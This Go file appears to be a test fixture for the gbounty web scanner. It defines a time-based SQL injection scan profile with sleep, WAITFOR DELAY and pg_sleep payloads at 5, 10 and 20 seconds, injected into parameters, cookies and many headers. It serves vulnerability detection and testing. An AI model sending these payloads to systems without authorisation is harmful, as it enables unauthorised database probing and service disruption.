package profilefakes

import "github.com/bountysecurity/gbounty/internal/profile"

func SQLiTimeBased() *profile.Active {
	return &profile.Active{
		Name:    "SQLi_Timebased",
		Enabled: true,
		Type:    profile.TypeActive,
		Author:  "@bountysecurity",
		Tags: []string{
			"All",
			"SQLi_TimeBased",
			"SQLi",
		},
		Steps: []profile.Step{
			// 5
			{
				RequestType:    profile.OriginalRequest,
				InsertionPoint: profile.InsertionPointModeSame,
				RawRequest:     "",
				Payloads: []string{
					"true,(select*from(select(sleep(5)))a)",
					"true,(sleep+5)--",
					"true,(sleep+5)",
					"true,(sleep(5))--",
					"true,(sleep(5))",
					"true,(SELECT+SLEEP(5))",
					"true,(WAITFOR+DELAY+\u00270:0:5\u0027)--",
					"true,(WAITFOR+DELAY+\u00270:0:5\u0027)",
					"true,(SELECT+pg_sleep(5))",
					"true,sleep(5)#",
				},
				PayloadPosition:      profile.Append,
				ChangeHTTPMethod:     false,
				ChangeHTTPMethodType: profile.ChangePostToGet,
				InsertionPoints: []profile.InsertionPointType{
					profile.HeaderUserAgent,
					profile.EntireBody,
					profile.ParamBodyValue,
					profile.CookieValue,
					profile.ParamJSONValue,
					profile.URLPathFolder,
					profile.ParamMultiAttrValue,
					profile.ParamBodyName,
					profile.ParamURLName,
					profile.ParamURLValue,
					profile.ParamXMLValue,
					profile.ParamXMLAttrValue,
					profile.URLPathFile,
					profile.CookieName,
					profile.ParamXMLName,
					profile.ParamXMLAttrName,
					profile.ParamMultiAttrName,
					profile.ParamJSONName,
					profile.HeaderReferer,
					profile.HeaderOrigin,
					profile.HeaderHost,
					profile.HeaderContentType,
					profile.HeaderAccept,
					profile.HeaderAcceptLanguage,
					profile.HeaderAcceptEncoding,
					profile.HeaderNew,
					profile.EntireBodyXML,
					profile.EntireBodyJSON,
					profile.EntireBodyMulti,
				},
				CustomHeaders: []string{
					"X-Forwarded-For",
					"X-Host",
					"X-Forwarded-Server",
					"X-Forwarded-Scheme",
					"X-Original-URL",
					"X-Rewrite-URL",
					"Forwarded",
					"Origin",
					"Referer",
					"X-Forwarded-Host",
					"X-Forwarded-Proto",
					"X-ProxyUser-Ip",
					"X-Wap-Profile",
					"Client-IP",
					"True-Client-IP",
					"Cluster-Client-IP",
					"X-Custom-IP-Authorization",
				},
				MatchAndReplaces: nil,
				Encoder:          nil,
				URLEncode:        false,
				CharsToURLEncode: "",
				Greps: []string{
					"true,,Time Delay,,5",
				},
				RedirType:             "",
				MaxRedir:              0,
				ShowAlert:             "",
				IssueName:             "",
				IssueSeverity:         "",
				IssueConfidence:       "",
				IssueDetail:           "",
				RemediationDetail:     "",
				IssueBackground:       "",
				RemediationBackground: "",
			},
			// 10
			{
				RequestType:    profile.OriginalRequest,
				InsertionPoint: profile.InsertionPointModeSame,
				RawRequest:     "",
				Payloads: []string{
					"true,(select*from(select(sleep(10)))a)",
					"true,(sleep+10)--",
					"true,(sleep+10)",
					"true,(sleep(10))--",
					"true,(sleep(10))",
					"true,(SELECT+SLEEP(10))",
					"true,(WAITFOR+DELAY+\u00270:0:10\u0027)--",
					"true,(WAITFOR+DELAY+\u00270:0:10\u0027)",
					"true,(SELECT+pg_sleep(10))",
					"true,sleep(10)#",
				},
				PayloadPosition:      profile.Append,
				ChangeHTTPMethod:     false,
				ChangeHTTPMethodType: profile.ChangePostToGet,
				InsertionPoints: []profile.InsertionPointType{
					profile.HeaderUserAgent,
					profile.EntireBody,
					profile.ParamBodyValue,
					profile.CookieValue,
					profile.ParamJSONValue,
					profile.URLPathFolder,
					profile.ParamMultiAttrValue,
					profile.ParamBodyName,
					profile.ParamURLName,
					profile.ParamURLValue,
					profile.ParamXMLValue,
					profile.ParamXMLAttrValue,
					profile.URLPathFile,
					profile.CookieName,
					profile.ParamXMLName,
					profile.ParamXMLAttrName,
					profile.ParamMultiAttrName,
					profile.ParamJSONName,
					profile.HeaderReferer,
					profile.HeaderOrigin,
					profile.HeaderHost,
					profile.HeaderContentType,
					profile.HeaderAccept,
					profile.HeaderAcceptLanguage,
					profile.HeaderAcceptEncoding,
					profile.HeaderNew,
					profile.EntireBodyXML,
					profile.EntireBodyJSON,
					profile.EntireBodyMulti,
				},
				CustomHeaders: []string{
					"X-Forwarded-For",
					"X-Host",
					"X-Forwarded-Server",
					"X-Forwarded-Scheme",
					"X-Original-URL",
					"X-Rewrite-URL",
					"Forwarded",
					"Origin",
					"Referer",
					"X-Forwarded-Host",
					"X-Forwarded-Proto",
					"X-ProxyUser-Ip",
					"X-Wap-Profile",
					"Client-IP",
					"True-Client-IP",
					"Cluster-Client-IP",
					"X-Custom-IP-Authorization",
				},
				MatchAndReplaces: nil,
				Encoder:          nil,
				URLEncode:        false,
				CharsToURLEncode: "",
				Greps: []string{
					"true,,Time Delay,,10",
				},
				RedirType:             "",
				MaxRedir:              0,
				ShowAlert:             "",
				IssueName:             "",
				IssueSeverity:         "",
				IssueConfidence:       "",
				IssueDetail:           "",
				RemediationDetail:     "",
				IssueBackground:       "",
				RemediationBackground: "",
			},
			// 20
			{
				RequestType:    profile.OriginalRequest,
				InsertionPoint: profile.InsertionPointModeSame,
				RawRequest:     "",
				Payloads: []string{
					"true,(select*from(select(sleep(20)))a)",
					"true,(sleep+20)--",
					"true,(sleep+20)",
					"true,(sleep(20))--",
					"true,(sleep(20))",
					"true,(SELECT+SLEEP(20))",
					"true,(WAITFOR+DELAY+\u00270:0:20\u0027)--",
					"true,(WAITFOR+DELAY+\u00270:0:20\u0027)",
					"true,(SELECT+pg_sleep(20))",
					"true,sleep(20)#",
				},
				PayloadPosition:      profile.Append,
				ChangeHTTPMethod:     false,
				ChangeHTTPMethodType: profile.ChangePostToGet,
				InsertionPoints: []profile.InsertionPointType{
					profile.HeaderUserAgent,
					profile.EntireBody,
					profile.ParamBodyValue,
					profile.CookieValue,
					profile.ParamJSONValue,
					profile.URLPathFolder,
					profile.ParamMultiAttrValue,
					profile.ParamBodyName,
					profile.ParamURLName,
					profile.ParamURLValue,
					profile.ParamXMLValue,
					profile.ParamXMLAttrValue,
					profile.URLPathFile,
					profile.CookieName,
					profile.ParamXMLName,
					profile.ParamXMLAttrName,
					profile.ParamMultiAttrName,
					profile.ParamJSONName,
					profile.HeaderReferer,
					profile.HeaderOrigin,
					profile.HeaderHost,
					profile.HeaderContentType,
					profile.HeaderAccept,
					profile.HeaderAcceptLanguage,
					profile.HeaderAcceptEncoding,
					profile.HeaderNew,
					profile.EntireBodyXML,
					profile.EntireBodyJSON,
					profile.EntireBodyMulti,
				},
				CustomHeaders: []string{
					"X-Forwarded-For",
					"X-Host",
					"X-Forwarded-Server",
					"X-Forwarded-Scheme",
					"X-Original-URL",
					"X-Rewrite-URL",
					"Forwarded",
					"Origin",
					"Referer",
					"X-Forwarded-Host",
					"X-Forwarded-Proto",
					"X-ProxyUser-Ip",
					"X-Wap-Profile",
					"Client-IP",
					"True-Client-IP",
					"Cluster-Client-IP",
					"X-Custom-IP-Authorization",
				},
				MatchAndReplaces: nil,
				Encoder:          nil,
				URLEncode:        false,
				CharsToURLEncode: "",
				Greps: []string{
					"true,,Time Delay,,20",
				},
				RedirType:             "",
				MaxRedir:              0,
				ShowAlert:             "",
				IssueName:             "",
				IssueSeverity:         "",
				IssueConfidence:       "",
				IssueDetail:           "",
				RemediationDetail:     "",
				IssueBackground:       "",
				RemediationBackground: "",
			},
		},
	}
}
